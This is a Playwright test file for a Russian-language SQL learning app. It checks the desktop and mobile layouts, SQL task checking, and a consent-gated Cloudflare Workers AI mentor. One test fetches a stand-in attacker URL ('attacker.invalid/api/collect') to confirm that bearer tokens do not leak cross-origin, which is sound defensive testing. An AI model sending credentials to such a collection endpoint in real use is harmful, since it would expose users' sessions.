import { expect, test } from '@playwright/test';
import { authenticatePage } from './auth-helper';
import { seedFirstLessonEvidence } from './navigation-helper';

const expectNoHorizontalOverflow = async (page: import('@playwright/test').Page) => {
  const overflow = await page.evaluate(() => document.documentElement.scrollWidth > window.innerWidth + 1);
  expect(overflow).toBe(false);
};

const replaceEditorSql = async (page: import('@playwright/test').Page, sql: string) => {
  const editor = page.locator('.monaco-editor');
  await expect(editor).toBeVisible();
  await editor.click();
  await page.keyboard.press('Control+A');
  await page.keyboard.insertText(sql);
};

const mockMentorWithoutUsingQuota = async (page: import('@playwright/test').Page) => {
  let requests = 0;
  await page.route('**/api/mentor', async route => {
    const origin = route.request().headers().origin || '*';
    const headers = {
      'access-control-allow-origin': origin,
      'access-control-allow-methods': 'POST, OPTIONS',
      'access-control-allow-headers': 'authorization, content-type, x-profile-id',
      'content-type': 'application/json; charset=utf-8'
    };
    if (route.request().method() === 'OPTIONS') {
      await route.fulfill({ status: 204, headers });
      return;
    }
    requests += 1;
    await route.fulfill({
      status: 200,
      headers,
      body: JSON.stringify({
        answer: 'Концепт\n• Сначала сформулируй ожидаемые строки.\n• Затем проверь WHERE и ORDER BY.',
        source: 'workers-ai',
        reason: 'provider-response',
        remaining: 19,
        exampleStatus: 'none',
        masteryAwarded: false
      })
    });
  });
  return () => requests;
};

test('desktop academy workflow is usable and shares the authenticated Cloudflare API', async ({ page }, testInfo) => {
  const pageErrors: string[] = [];
  page.on('pageerror', error => pageErrors.push(error.message));
  await authenticatePage(page, 'desktop-academy');
  const mentorRequests = await mockMentorWithoutUsingQuota(page);

  await page.goto('./');
  await expect(page.getByTestId('guided-first-run')).toBeVisible();
  await expect(page.getByRole('heading', { name: /Сначала выберем/i })).toBeVisible();
  await expect(page.locator('.mobile-bottom-nav')).toBeHidden();
  await expectNoHorizontalOverflow(page);

  const cloudHealth = await page.evaluate(async () => {
    const response = await fetch('/api/health');
    return { status: response.status, body: await response.json() };
  });
  expect(cloudHealth.status).toBe(200);
  expect(cloudHealth.body).toMatchObject({ ok: true, d1: true, kv: true, ai: true, progressVersion: 4 });

  const cloudProgress = await page.evaluate(async () => {
    const response = await fetch('/api/progress');
    return { status: response.status, body: await response.json() };
  });
  expect(cloudProgress.status).toBe(200);
  expect(cloudProgress.body).toHaveProperty('progress');

  await page.locator('.sidebar nav').getByRole('button', { name: 'Практика' }).click();
  await expect(page.getByRole('heading', { name: 'Практика' })).toBeVisible();
  await seedFirstLessonEvidence(page);
  const firstTask = page.locator('.task-row').first();
  await expect(firstTask).toContainText('Текущий шаг маршрута');
  await firstTask.click();

  await expect(page.locator('.editor-panel')).toBeVisible();
  await expect(page.locator('.mentor-panel')).toBeVisible();
  const runButton = page.getByRole('button', { name: /Проверить SQL/ });
  await expect(runButton).toBeEnabled();

  await replaceEditorSql(page, 'SELECT ticket_id, service FROM tickets;');
  await runButton.click();
  await expect(page.locator('.feedback.success')).toContainText('Верно');
  await expect(page.locator('.result-table-wrap')).toBeVisible();

  await page.locator('.mentor-panel').getByRole('button', { name: 'Объяснить тему' }).click();
  await expect(page.locator('.mentor-panel .mentor-answer')).toContainText('Концепт');
  await expect(page.getByTestId('mentor-source')).toContainText('Локальная подсказка');
  expect(mentorRequests()).toBe(0);
  await page.locator('.mentor-panel').getByRole('checkbox', { name: /Разрешить Cloudflare Workers AI/ }).check();
  await page.locator('.mentor-panel').getByRole('button', { name: 'Объяснить тему' }).click();
  await expect(page.getByTestId('mentor-source')).toContainText('Cloudflare Workers AI');
  expect(mentorRequests()).toBe(1);
  await expectNoHorizontalOverflow(page);

  await page.screenshot({ path: testInfo.outputPath('desktop-academy.png'), fullPage: true });
  expect(pageErrors).toEqual([]);
});

test('desktop academy never leaks bearer credentials to a cross-origin api-shaped URL', async ({ page }) => {
  await authenticatePage(page, 'origin-leak');
  let leakedAuthorization = '';
  await page.route('https://attacker.invalid/api/collect', async route => {
    leakedAuthorization = route.request().headers().authorization || '';
    await route.fulfill({
      status: 200,
      headers: { 'access-control-allow-origin': '*', 'content-type': 'application/json' },
      body: JSON.stringify({ ok: true })
    });
  });

  await page.goto('./');
  const storage = await page.evaluate(async () => {
    await fetch('https://attacker.invalid/api/collect');
    return {
      metadata: localStorage.getItem('sql-academy-auth-session-v2') || '',
      ephemeralTokenPresent: Boolean(sessionStorage.getItem('sql-academy-auth-token-v1'))
    };
  });

  expect(leakedAuthorization).toBe('');
  expect(storage.metadata).not.toContain('"token"');
  expect(storage.ephemeralTokenPresent).toBe(true);
});

test('mobile task flow uses four product actions and list-to-editor navigation after login', async ({ page }, testInfo) => {
  const pageErrors: string[] = [];
  page.on('pageerror', error => pageErrors.push(error.message));
  await authenticatePage(page, 'mobile-academy');

  await page.goto('./');
  const mobileNavigation = page.locator('.mobile-bottom-nav');
  await expect(mobileNavigation).toBeVisible();
  await expect(mobileNavigation.locator(':scope > button')).toHaveCount(4);
  await expect(mobileNavigation.getByRole('button', { name: 'Сегодня' })).toBeVisible();
  await expect(mobileNavigation.getByRole('button', { name: 'Маршрут' })).toBeVisible();
  await expect(mobileNavigation.getByRole('button', { name: 'Практика' })).toBeVisible();
  await expect(mobileNavigation.getByRole('button', { name: 'Ещё' })).toBeVisible();
  await expectNoHorizontalOverflow(page);

  await mobileNavigation.getByRole('button', { name: 'Практика' }).click();
  await expect(page.getByRole('heading', { name: 'Практика' })).toBeVisible();
  await seedFirstLessonEvidence(page);
  const firstTask = page.locator('.task-row').first();
  await expect(firstTask).toContainText('Текущий шаг маршрута');
  await firstTask.click();

  await expect(page.locator('.catalog-panel')).toBeHidden();
  await expect(page.locator('.editor-panel')).toBeVisible();
  await expect(page.locator('.monaco-editor')).toBeVisible();
  await expect(page.getByRole('button', { name: /Проверить SQL/ })).toBeEnabled();
  await expect(page.getByRole('button', { name: 'К списку' })).toBeVisible();
  const mentorConsent = page.locator('.mentor-panel').getByRole('checkbox', { name: /Разрешить Cloudflare Workers AI/ });
  await mentorConsent.scrollIntoViewIfNeeded();
  await expect(mentorConsent).toBeVisible();
  await expect(page.getByTestId('mentor-source')).toContainText('Локальная подсказка');
  await mentorConsent.check();
  await expect(mentorConsent).toBeChecked();

  await page.getByRole('button', { name: 'Развернуть редактор' }).click();
  await expect(page.locator('.editor-panel')).toHaveClass(/fullscreen/);
  await page.getByRole('button', { name: 'Свернуть редактор' }).click();
  await expect(page.locator('.editor-panel')).not.toHaveClass(/fullscreen/);

  await expectNoHorizontalOverflow(page);
  await page.screenshot({ path: testInfo.outputPath('mobile-academy.png'), fullPage: true });
  expect(pageErrors).toEqual([]);
});
